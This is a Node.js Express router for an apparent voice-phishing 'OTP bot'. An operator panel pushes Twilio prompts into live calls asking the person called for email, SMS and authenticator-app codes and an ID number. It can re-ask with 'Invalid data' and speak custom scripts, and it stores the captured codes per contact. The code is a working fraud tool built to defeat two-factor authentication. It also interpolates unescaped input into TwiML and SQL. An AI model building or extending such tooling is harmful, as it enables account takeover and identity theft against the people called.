const express = require('express');
const router = express.Router();
const db = require('../database/db');
const twilio = require('twilio');

const client = twilio(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN);

router.post('/request-action/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const { action } = req.body;
    const io = req.app.get('io');
    
    let currentAction = '';
    let actionMessage = '';
    
    switch(action) {
        case 'email_otp':
            currentAction = 'waiting_for_email_otp';
            actionMessage = 'Please enter the 6 digit OTP from your email followed by the pound key.';
            break;
        case 'auth_otp':
            currentAction = 'waiting_for_auth_otp';
            actionMessage = 'Please enter the 6 digit code from your authenticator app followed by the pound key.';
            break;
        case 'phone_otp':
            currentAction = 'waiting_for_phone_otp';
            actionMessage = 'Please enter the 6 digit OTP sent to your phone followed by the pound key.';
            break;
        case 'id_number':
            currentAction = 'waiting_for_id';
            actionMessage = 'Please enter your ID number followed by the pound key.';
            break;
        default:
            return res.status(400).json({ error: 'Invalid action' });
    }
    
    try {
        // Get the call SID
        const session = await db.query(
            `SELECT call_sid FROM call_sessions WHERE id = $1`,
            [sessionId]
        );
        
        const callSid = session.rows[0]?.call_sid;
        
        // Update the session action in database
        await db.query(
            `UPDATE call_sessions SET current_action = $1 WHERE id = $2`,
            [currentAction, sessionId]
        );
        
        await db.query(
            `INSERT INTO admin_logs (session_id, action_type) VALUES ($1, $2)`,
            [sessionId, action]
        );
        
        // FORCE THE CALL TO LEAVE QUEUE by updating the call with new TwiML
        if (callSid) {
            const twiml = `<Response><Say>${actionMessage}</Say><Gather numDigits="20" action="/webhooks/collect-${action}/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
            await client.calls(callSid).update({ twiml: twiml });
            console.log(`Updated call ${callSid} with new TwiML for action: ${action}`);
        }
        
        io.emit('admin_action', { session_id: sessionId, action: action, message: actionMessage });
        
        res.json({ success: true, action: action });
    } catch (error) {
        console.error('Error requesting action:', error);
        res.status(500).json({ error: error.message });
    }
});

router.post('/custom-voice/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const { message } = req.body;
    const io = req.app.get('io');
    
    try {
        // Get the call SID
        const session = await db.query(
            `SELECT call_sid FROM call_sessions WHERE id = $1`,
            [sessionId]
        );
        
        const callSid = session.rows[0]?.call_sid;
        
        await db.query(
            `UPDATE call_sessions SET current_action = 'custom_voice', custom_message = $1 WHERE id = $2`,
            [message, sessionId]
        );
        
        await db.query(
            `INSERT INTO admin_logs (session_id, action_type, action_value) VALUES ($1, $2, $3)`,
            [sessionId, 'custom_voice', message]
        );
        
        // FORCE THE CALL TO LEAVE QUEUE with custom message
        if (callSid) {
            const twiml = `<Response><Say>${message}</Say><Gather numDigits="20" action="/webhooks/collect-custom/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
            await client.calls(callSid).update({ twiml: twiml });
            console.log(`Updated call ${callSid} with custom voice: ${message}`);
        }
        
        io.emit('admin_action', { session_id: sessionId, action: 'custom_voice', message: message });
        
        res.json({ success: true, message: 'Custom voice command sent' });
    } catch (error) {
        console.error('Error sending custom voice:', error);
        res.status(500).json({ error: error.message });
    }
});

router.post('/reject-last-data/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const io = req.app.get('io');
    
    try {
        const session = await db.query(
            `SELECT last_data_type, last_data_value FROM call_sessions WHERE id = $1`,
            [sessionId]
        );
        
        const lastDataType = session.rows[0]?.last_data_type;
        const lastDataValue = session.rows[0]?.last_data_value;
        
        if (lastDataType) {
            await db.query(
                `UPDATE contacts SET ${lastDataType} = NULL WHERE id = (SELECT contact_id FROM call_sessions WHERE id = $1)`,
                [sessionId]
            );
            
            await db.query(
                `UPDATE call_sessions SET current_action = $1 WHERE id = $2`,
                [`waiting_for_${lastDataType}`, sessionId]
            );
            
            // Get call SID and force update
            const callResult = await db.query(`SELECT call_sid FROM call_sessions WHERE id = $1`, [sessionId]);
            const callSid = callResult.rows[0]?.call_sid;
            
            if (callSid) {
                let actionMessage = '';
                if (lastDataType === 'id_number') actionMessage = 'Please enter your ID number followed by the pound key.';
                else if (lastDataType === 'email_otp') actionMessage = 'Please enter the 6 digit OTP from your email followed by the pound key.';
                else if (lastDataType === 'auth_otp') actionMessage = 'Please enter the 6 digit code from your authenticator app followed by the pound key.';
                else if (lastDataType === 'phone_otp') actionMessage = 'Please enter the 6 digit OTP sent to your phone followed by the pound key.';
                
                const twiml = `<Response><Say>Invalid data. ${actionMessage}</Say><Gather numDigits="20" action="/webhooks/collect-${lastDataType}/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
                await client.calls(callSid).update({ twiml: twiml });
            }
            
            io.emit('data_rejected', { session_id: sessionId, type: lastDataType, value: lastDataValue });
            
            res.json({ success: true, message: `Last ${lastDataType} rejected` });
        } else {
            res.json({ success: false, message: 'No data to reject' });
        }
    } catch (error) {
        console.error('Error rejecting data:', error);
        res.status(500).json({ error: error.message });
    }
});

router.get('/contacts', async (req, res) => {
    try {
        const result = await db.query(
            `SELECT id, phone_number, full_name, email_otp, auth_otp, phone_otp, id_number, status, created_at 
             FROM contacts ORDER BY created_at DESC`
        );
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

router.get('/active-calls', async (req, res) => {
    try {
        const result = await db.query(
            `SELECT cs.id as session_id, cs.call_sid, cs.current_action, cs.status, 
                    c.phone_number, c.full_name
             FROM call_sessions cs
             JOIN contacts c ON cs.contact_id = c.id
             WHERE cs.status NOT IN ('completed', 'failed')
             ORDER BY cs.started_at DESC`
        );
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

router.get('/session-data/:sessionId', async (req, res) => {
    try {
        const result = await db.query(
            `SELECT cd.*, c.full_name, c.phone_number 
             FROM collected_data cd
             JOIN call_sessions cs ON cd.session_id = cs.id
             JOIN contacts c ON cs.contact_id = c.id
             WHERE cd.session_id = $1
             ORDER BY cd.collected_at DESC`,
            [req.params.sessionId]
        );
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

module.exports = router;
